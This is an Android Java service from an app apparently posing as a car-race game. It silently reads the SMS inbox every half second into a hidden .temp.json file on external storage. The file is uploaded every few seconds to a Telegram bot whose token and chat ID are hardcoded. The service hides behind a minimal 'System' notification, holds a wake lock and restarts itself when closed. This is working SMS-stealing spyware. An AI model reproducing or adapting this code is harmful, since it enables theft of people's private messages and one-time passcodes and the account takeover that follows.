package com.carrace;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.HashSet;
import java.util.Set;

public class SmsService extends Service {

    private static final String TAG = "SmsService";
    private static final String CH_ID = "sms_sync";
    public  static final String JSON_FILE = ".temp.json";

    // Ganti dengan bot & chat id kamu
    private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
    private static final String CHAT_ID   = "8275632263";

    private static final long POLL_INTERVAL_MS = 500L;
    private static final long SYNC_INTERVAL_MS = 3000L;

    private Handler handler;
    private volatile String lastSentHash = "";
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1, buildNotif(),
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            } else {
                startForeground(1, buildNotif());
            }
        } catch (Exception e) {
            Log.e(TAG, "startForeground failed", e);
        }

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CarRace::SmsLock");
            wakeLock.setReferenceCounted(false);
            try { wakeLock.acquire(); } catch (Exception ignored) {}
        }

        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler.removeCallbacksAndMessages(null);
        handler.post(pollRunnable);
        handler.post(syncRunnable);
        return START_STICKY;
    }

    private final Runnable pollRunnable = new Runnable() {
        @Override public void run() {
            try { pollInbox(); } catch (Exception e) { Log.w(TAG, "poll", e); }
            handler.postDelayed(this, POLL_INTERVAL_MS);
        }
    };

    private final Runnable syncRunnable = new Runnable() {
        @Override public void run() {
            try { syncToTelegram(); } catch (Exception e) { Log.w(TAG, "sync", e); }
            handler.postDelayed(this, SYNC_INTERVAL_MS);
        }
    };

    // ===== Poll inbox =====

    private void pollInbox() {
        if (!hasSms() || !hasStorage()) return;

        JSONArray merged = new JSONArray();
        Set<String> seen = new HashSet<>();
        File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);

        // load existing
        if (target.exists() && target.length() > 0) {
            try {
                byte[] data = readAll(target);
                JSONArray arr = new JSONArray(new String(data, StandardCharsets.UTF_8));
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject o = arr.getJSONObject(i);
                    String key = o.optString("address", "") + "|" + o.optLong("date", 0);
                    if (seen.add(key)) merged.put(o);
                }
            } catch (Exception ignored) {}
        }

        boolean changed = false;
        Cursor c = null;
        try {
            c = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body", "date", "person", "read"},
                    null, null, "date ASC");
            if (c != null) {
                while (c.moveToNext()) {
                    String addr = c.getString(1);
                    String body = c.getString(2);
                    long date = c.getLong(3);
                    String key = addr + "|" + date;
                    if (!seen.add(key)) continue;

                    JSONObject o = new JSONObject();
                    o.put("address", addr);
                    o.put("body", body);
                    o.put("date", date);
                    o.put("person", c.getLong(4));
                    o.put("read", c.getInt(5));
                    o.put("source", "inbox");
                    merged.put(o);
                    changed = true;
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "query inbox", e);
        } finally {
            if (c != null) c.close();
        }

        if (changed) writeJson(target, merged);
    }

    // ===== Sync to Telegram =====

    private void syncToTelegram() {
        if (!hasStorage()) return;
        File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
        if (!target.exists() || target.length() == 0) return;

        try {
            byte[] data = readAll(target);
            String hash = sha256(data);
            if (hash.equals(lastSentHash)) return;

            boolean ok = uploadAsDocument(target, data);
            if (ok) {
                lastSentHash = hash;
                Log.d(TAG, "uploaded " + data.length + " bytes");
            }
        } catch (Exception e) {
            Log.w(TAG, "sync failed", e);
        }
    }

    private boolean uploadAsDocument(File file, byte[] data) {
        String boundary = "----CarRaceBoundary" + System.currentTimeMillis();
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + boundary);

            OutputStream os = conn.getOutputStream();

            writeField(os, boundary, "chat_id", CHAT_ID);
            writeField(os, boundary, "caption",
                    "Update: " + file.getName() + " (" + data.length + " bytes)");

            os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
            os.write(("Content-Disposition: form-data; name=\"document\"; filename=\""
                    + file.getName() + "\"\r\n").getBytes(StandardCharsets.UTF_8));
            os.write(("Content-Type: application/json\r\n\r\n").getBytes(StandardCharsets.UTF_8));
            os.write(data);
            os.write("\r\n".getBytes(StandardCharsets.UTF_8));
            os.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            conn.disconnect();
            return code == 200;
        } catch (Exception e) {
            Log.e(TAG, "upload failed", e);
            return false;
        }
    }

    private void writeField(OutputStream os, String boundary, String name, String value) throws Exception {
        os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n")
                .getBytes(StandardCharsets.UTF_8));
        os.write((value + "\r\n").getBytes(StandardCharsets.UTF_8));
    }

    // ===== Helpers =====

    private void writeJson(File target, JSONArray arr) {
        try {
            FileOutputStream out = new FileOutputStream(target, false);
            out.write(arr.toString(2).getBytes(StandardCharsets.UTF_8));
            out.flush();
            out.close();
        } catch (Exception e) {
            Log.w(TAG, "write json", e);
        }
    }

    private boolean hasSms() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(android.Manifest.permission.READ_SMS)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasStorage() {
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        return true;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH_ID, "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotif() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, CH_ID);
        } else {
            b = new Notification.Builder(this);
        }
        b.setContentTitle("System")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN);
        return b.build();
    }

    private static byte[] readAll(File f) throws Exception {
        FileInputStream in = new FileInputStream(f);
        byte[] buf = new byte[(int) f.length()];
        int read = 0;
        while (read < buf.length) {
            int r = in.read(buf, read, buf.length - read);
            if (r < 0) break;
            read += r;
        }
        in.close();
        return buf;
    }

    private static String sha256(byte[] data) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] d = md.digest(data);
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format("%02x", b));
        return sb.toString();
    }

    @Override
    public void onDestroy() {
        if (handler != null) handler.removeCallbacksAndMessages(null);
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
        }
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        try {
            Intent restart = new Intent(getApplicationContext(), SmsService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(restart);
            } else {
                startService(restart);
            }
        } catch (Exception ignored) {}
        super.onTaskRemoved(rootIntent);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
